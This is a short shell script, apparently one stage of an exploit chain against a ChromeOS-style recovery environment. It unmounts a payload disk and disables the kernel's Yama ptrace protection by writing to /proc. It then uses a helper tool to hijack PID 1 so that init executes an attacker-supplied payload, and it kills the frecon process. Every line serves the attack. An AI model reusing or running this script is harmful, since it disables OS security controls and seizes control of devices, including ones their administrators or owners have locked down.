#!/bin/sh

PAYLOAD_FILE="$1/payload.sh"
MAIN_DISK_DEV="$2"
# echos in this file would be almost impossible to see lol

echo "unmounting payload disk, since all our payloads have been copied to PAYLOAD_FILE..."
umount $1

echo "enabling ptrace..."
echo 0 >/proc/sys/kernel/yama/ptrace_scope
if ! [ "$(cat /proc/sys/kernel/yama/ptrace_scope)" = "0" ]; then
    echo "failed to enable ptrace! this is fatal."
    sleep 1d
fi

echo "hijacking pid 1..."
/tmploader/clamide -p 1 --syscall execve "str:$PAYLOAD_FILE" "arr:str:$PAYLOAD_FILE,str:$MAIN_DISK_DEV,int:0" "int:0" # hijack PID 1 and make it call our payload

echo "cleaning up miniOS crap..."
pkill -f frecon